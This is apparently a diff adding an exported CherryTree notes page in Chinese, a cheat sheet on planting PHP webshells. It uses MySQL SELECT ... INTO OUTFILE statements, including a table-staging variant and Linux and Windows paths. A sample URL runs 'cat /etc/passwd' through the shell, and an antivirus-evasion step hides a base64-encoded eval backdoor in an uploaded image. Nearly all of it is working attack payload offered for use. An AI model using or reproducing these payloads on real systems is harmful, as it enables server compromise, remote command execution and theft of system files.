@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>导出一句话</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>导出一句话</h1><br/>直接导出一句话后门<br />select &#39;&lt;?php @eval($_POST[antian365]);?&gt;&#39;INTO OUTFILE &#39;D:/work/WWW/antian365.php&#39;<br /><br />创建数据库导出一句话后门<br />CREATE TABLE `mysql`.`antian365` (`temp` TEXT NOTNULL );<br />INSERT INTO `mysql`.`antian365` (`temp` ) VALUES(&#39;&lt;?php @eval($_POST[antian365]);?&gt;&#39;);<br />SELECT `temp` FROM `antian365` INTO OUTFILE&#39;D:/www/antian365.php&#39;;<br />DROP TABLE IF EXISTS `antian365`;<br /><br />可执行命令方式<br />select &#39;&lt;?php echo \&#39;&lt;pre&gt;\&#39;;system($_GET[\&#39;cmd\&#39;]); echo \&#39;&lt;/pre&gt;\&#39;; ?&gt;&#39; INTO OUTFILE &#39;d:/www/antian365.php&#39;<br /><br />另外在 linux 下可以导出直接执行命令的 shell：<br />SELECT &#39;&lt;? system($_GET[\&#39;c\&#39;]); ?&gt;&#39; INTO OUTFILE &#39;/var/www/shell.php&#39;;<br /><a href="http://localhost/shell.php?c=cat%20/etc/passwd">http://localhost/shell.php?c=cat%20/etc/passwd</a><br /><br />1、过杀毒软件方式,上传图片<br />&lt;?php$a=&#39; PD9waHAgQGV2YWwoJF9QT1NUWydhbnRpYW4zNjUnXSk7ZGllKCk7Pz4=&#39;;error_reporting(0);@set_time_limit(0);eval(&quot;?&gt;&quot;.base64_decode($a));?&gt;<br /><br />//&lt;?php @eval($_POST[&#39;antian365&#39;]);die();?&gt;<br /><br />2、然后通过图片包含temp.php，导出webshell。<br />select &#39;&lt;?php include &#39;publicguide.jpg&#39; ?&gt;&#39;INTO OUTFILE &#39;D:/work/WWW/antian365.php&#39;<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>
